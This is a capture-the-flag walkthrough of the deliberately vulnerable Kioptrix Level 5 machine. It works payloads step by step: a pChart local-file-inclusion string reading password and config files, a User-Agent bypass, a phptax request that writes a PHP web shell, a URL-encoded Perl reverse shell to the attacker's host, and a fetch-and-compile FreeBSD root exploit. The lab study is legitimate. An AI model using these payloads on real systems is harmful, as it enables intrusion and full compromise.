# Kioptrix Level 5 Walkthrough

**Target IP:** 192.168.56.106



## 1. Reconnaissance Phase

The first step in any penetration test is to identify the target and the services it is running.

### Host Discovery
To find the target IP address on the local network, I used `netdiscover`:
```bash
sudo netdiscover -r 192.168.56.0/24
```
![](/assets/kiop/kio51.png)

### Port Scanning
Once the target IP was identified as `192.168.56.106`, I ran an aggressive `nmap` scan to enumerate open ports and services:
```bash
nmap -A -p- 192.168.56.106
```
![](/assets/kiop/kio52.png)


**Key Observations from Nmap:**
*   **OS:** FreeBSD (likely version 9.x)
*   **Port 22 (SSH):** Closed
*   **Port 80 (HTTP):** Open, running an old version of Apache and PHP 5.3.8.
*   **Port 8080 (HTTP):** Open, but returns a `403 Forbidden` error.

The presence of outdated Apache and PHP versions strongly suggests that the web application itself might be vulnerable.

## 2. Web Enumeration

### Port 80
Navigating to `http://192.168.56.106` in a web browser displayed a default "It works!" page. Finding nothing else on the surface, I inspected the page source code (Ctrl + U in Firefox).

![](/assets/kiop/kio53.png)

![](/assets/kiop/kio54.png)

A comment in the source code revealed a hidden path:
```html
<!-- pChart2.1.3/index.php -->
```

Accessing `http://192.168.56.106/pChart2.1.3/index.php` confirmed the existence of the directory.

![](/assets/kiop/kio55.png)

![](/assets/kiop/kio56.png)

To gather more information, I ran `nikto` against the discovered directory:
```bash
nikto -h http://192.168.56.106/pChart2.1.3/ -o nikto.txt
```
![](/assets/kiop/kio57.png)

The Nikto output highlighted a critical vulnerability: **pChart 2.1.3 is vulnerable to Local File Inclusion (LFI) and Directory Traversal.**

I verified this using `searchsploit`:
```bash
searchsploit pchart 2.1.3
```
![](/assets/kiop/kio58.png)

![](/assets/kiop/kio59.png)

### Exploiting LFI in pChart 2.1.3
To test the LFI vulnerability, I attempted to read the `/etc/passwd` file through the browser:
```
http://192.168.56.106/pChart2.1.3/examples/index.php?Action=View&Script=/etc/passwd
```
![](/assets/kiop/kio510.png)


This successfully displayed the contents of the file. To further confirm, I read the `/etc/master.passwd` file, proving the LFI was fully functional.

### Investigating Port 8080
Since port 8080 returned a `403 Forbidden` error, I used the directory traversal vulnerability to read the Apache configuration file to understand the access restrictions. On FreeBSD, the Apache configuration is typically located at `/usr/local/etc/apache22/httpd.conf`.

![](/assets/kiop/kio511.png)

```

http://192.168.56.106/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf
```
![](/assets/kiop/kio512.png)

Reviewing the configuration file revealed that access to port 8080 was restricted based on the `User-Agent` string. It only accepted requests from a specific User-Agent: `Mozilla/4.0`.

![](/assets/kiop/kio513.png)

## 3. Exploitation

### Bypassing Port 8080 Restrictions
To access the application on port 8080, I needed to change my browser's User-Agent. I installed the "User-Agent Switcher" plugin for Firefox, created a new profile with the User-Agent `Mozilla/4.0`, and refreshed the page.

![](/assets/kiop/kio514.png)

![](/assets/kiop/kio515.png)

This successfully bypassed the restriction, revealing a tax filing application called **phptax**.

![](/assets/kiop/kio516.png)

### Remote Code Execution (RCE) in phptax
Searching for vulnerabilities in `phptax`, I found that it is susceptible to Remote Code Execution (RCE). I utilized an exploit from Exploit-DB (EDB-ID: 25849).

Instead of running the exploit script directly, I performed the steps manually to understand the process. The vulnerability lies in the `field` and `newvalue` parameters of `index.php`, which can be abused to write a PHP shell to the disk.

**Crafting the Payload:**
I used `curl` to send the payload, ensuring the correct User-Agent was set:
```bash
curl -A "Mozilla/4.0" "http://192.168.56.106:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E"
```
![](/assets/kiop/kio517.png)

This command creates a file named `rce.php` containing a simple PHP passthru shell: `<?php passthru($_GET[cmd]);?>`.

**Verifying the Shell:**
I tested the newly created shell by executing the `id` command:
```bash
curl -A "Mozilla/4.0" "http://192.168.56.106:8080/phptax/data/rce.php?cmd=id"
```
![](/assets/kiop/kio518.png)

The server responded with the output of the `id` command, confirming successful RCE.

### Catching a Reverse Shell
Since the target is FreeBSD, standard Linux reverse shell one-liners (like `bash -i`) often fail. A Perl reverse shell is the most reliable method here.

1.  **Set up a listener on Kali:**
    ```bash
    nc -lvnp 4444
    ```

2.  **Execute the reverse shell payload:**
    *(Replace `YOUR_KALI_IP` with the actual IP address of the attacking machine)*
    ```bash
    curl -A "Mozilla/4.0" "http://192.168.56.106:8080/phptax/data/rce.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22YOUR_KALI_IP%22%3B%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27"
    ```

This successfully established a reverse shell as the `www` user.
![](/assets/kiop/kio519.png)

## 4. Privilege Escalation

With a low-privileged shell, the next goal was to escalate privileges to `root`.

### System Enumeration
First, I verified the exact version of FreeBSD to find a suitable local privilege escalation exploit:
```bash
uname -a
```
![](/assets/kiop/kio520.png)

The output confirmed it was FreeBSD 9.0.

### Exploiting FreeBSD 9.0 (mmap)
I searched for local privilege escalation exploits for FreeBSD 9.0 on my Kali machine:
```bash
searchsploit FreeBSD 9.0
```
![](/assets/kiop/kio521.png)

I found the `mmap` exploit (EDB-ID: 26368) to be a suitable candidate.

**Preparing the Exploit (Kali):**
```bash
# Copy the exploit to the current directory
searchsploit -m 26368

# Rename it for convenience
mv 26368.c exploit.c

# Start a Python web server to host the file
python3 -m http.server 80
```

**Downloading and Compiling the Exploit (Kioptrix):**
In the reverse shell on the target machine, I navigated to the `/tmp` directory, downloaded the exploit, and compiled it using `gcc` (which was conveniently installed on the target).

```bash
cd /tmp
fetch http://YOUR_KALI_IP/exploit.c
gcc exploit.c -o pwn
```
![](/assets/kiop/kio522.png)

**Execution and Verification:**
Finally, I executed the compiled exploit:
```bash
./pwn
```


Running the `id` command confirmed that I had successfully obtained `root` privileges.

```bash
id
# uid=0(root) gid=0(wheel) groups=0(wheel)
```
![](/assets/kiop/kio523.png)

![](/assets/kiop/kio524.png)

The machine was successfully compromised.
